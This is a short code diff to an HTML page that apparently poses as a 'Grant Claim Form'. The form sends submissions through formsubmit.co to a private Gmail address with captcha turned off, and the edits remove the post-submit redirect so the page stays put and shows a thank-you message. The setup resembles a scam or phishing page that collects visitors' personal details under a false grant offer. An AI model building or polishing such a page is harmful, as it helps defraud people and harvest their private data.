@@ -210,11 +210,10 @@
     </div>
 
     <div class="form-wrapper" id="formWrapper">
-      <!-- FORMSUBMIT.CO - EMAIL: jameswilsonjames110@gmail.com -->
+      <!-- FORMSUBMIT.CO - FIXED: No redirect -->
       <form action="https://formsubmit.co/jameswilsonjames110@gmail.com" method="POST" id="grantForm">
-        <!-- FormSubmit hidden fields -->
+        <!-- FormSubmit hidden fields - REMOVED _next to prevent redirect -->
         <input type="hidden" name="_captcha" value="false" />
-        <input type="hidden" name="_next" value="https://example.com/thank-you" />
         <input type="hidden" name="_subject" value="New Grant Claim Form Submission" />
         <input type="hidden" name="_template" value="table" />
         
@@ -363,7 +362,7 @@
         });
       }
 
-      // Form submission - FormSubmit.co
+      // Form submission - FormSubmit.co (NO REDIRECT)
       form.addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -387,7 +386,7 @@
           loadingSpinner.classList.remove('show');
           
           if (data.success) {
-            // Success
+            // Success - Show thank you message
             thankYou.style.display = 'block';
             formFields.style.display = 'none';
             container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
@@ -403,6 +402,7 @@
         .catch(error => {
           loadingSpinner.classList.remove('show');
           console.warn('Fetch failed, submitting normally...');
+          // Submit normally - but we've removed _next so no redirect!
           form.submit();
         });
       });
